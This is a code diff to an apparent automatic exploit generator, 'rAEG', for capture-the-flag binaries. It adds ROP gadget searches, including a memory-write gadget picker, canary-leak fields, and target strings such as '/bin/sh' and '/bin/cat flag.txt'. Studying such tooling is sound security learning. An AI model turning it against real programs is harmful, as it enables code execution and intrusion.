@@ -20,9 +20,9 @@ context.update(
 
 # Important lists to use
 strings =  ["/bin/sh", "/bin/cat flag.txt", "flag.txt"]
-exploit_functions = ["win", "system", "execve", "syscall"]
-regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]
-
+exploit_functions = ["win", "system", "execve", "syscall", "print_file"]
+arg_regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]
+useful_rop_functions = ["__libc_csu_init"]
 
 
 class rAEG:
@@ -35,7 +35,11 @@ class rAEG:
         self.rop_calls = []
 
         self.string_address = None
+
         self.got_overwrite_address = None
+
+        self.canary = None
+        self.canary_leak = None
 
         # Create angr project
         self.proj = angr.Project(binary_path, load_options={"auto_load_libs":False})
@@ -122,6 +126,7 @@ class rAEG:
             # Set functions and parameters as a dictionary set
         self.find_reg_gadget("rax")
         self.find_reg_gadget("rdx")
+        self.find_reg_gadget("rsi")
         self.find_write_gadget()
 
         self.parameters = None
@@ -132,6 +137,7 @@ class rAEG:
     # Find gadget to control register
     def find_reg_gadget(self, register):
         output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--re", f"pop {register}", "--filter", "jmp"]).split(b"\n")
+
         output.pop(0)
         output.pop(0)
         output.pop(-1)
@@ -149,14 +155,13 @@ class rAEG:
                 min_gadget = gadget
 
         log.info(f"Found gadget: {min_gadget}")
-        print(output)
         return None
 
 
 
     # Find gadget to write to writable address in memory
     def find_write_gadget(self):
-        output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--re", "mov .word ptr \[.*\], *."]).split(b"\n")
+        output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--re", "mov .word ptr \[.*\], *.", "--filter", "jmp"]).split(b"\n")
         output.pop(0)
         output.pop(0)
         output.pop(-1)
@@ -164,8 +169,37 @@ class rAEG:
         output.pop(-1)
 
         # First get check to make sure that the same register isn't being dereferenced
+        # Add all gadgets that are valid to a list
+        # Optimal gadgets will have both registers using 64 bit for the mov write primitive
+        valid_gadgets = []
+        optimal_gadgets = []
+        for gadget in output:
+            instructions = gadget.split(b";")
+            for instruction in instructions:
+                if b"ptr" in instruction:
+                    reg1 = instruction.split(b"[")[1].split(b",")[0].strip(b"]").strip()
+                    reg2 = instruction.split(b"[")[1].split(b",")[1].strip(b"]").strip()
+                    if reg1[1:] != reg2[1:]:
+                        valid_gadgets.append(gadget)
+                        if chr(reg1[0]) == "r":
+                            if chr(reg2[0]) == "r":
+                                optimal_gadgets.append(gadget)
 
 
+        # If there are no optimal gadgets choose from valid ones``
+        if len(optimal_gadgets) <= 0:
+            optimal_gadgets = valid_gadgets
+
+        # Find the gadget with the lowest amount of instructions
+        min_gadget = optimal_gadgets[0]
+        min_instructions = optimal_gadgets[0].count(b";") + 1
+        for gadget in optimal_gadgets:
+           instructions = gadget.count(b";") + 1
+           if instructions < min_instructions:
+               min_instructions = instructions
+               min_gadget =  gadget
+
+        log.info(f"Found gadget: {min_gadget}")
         print(output)
         return None
 
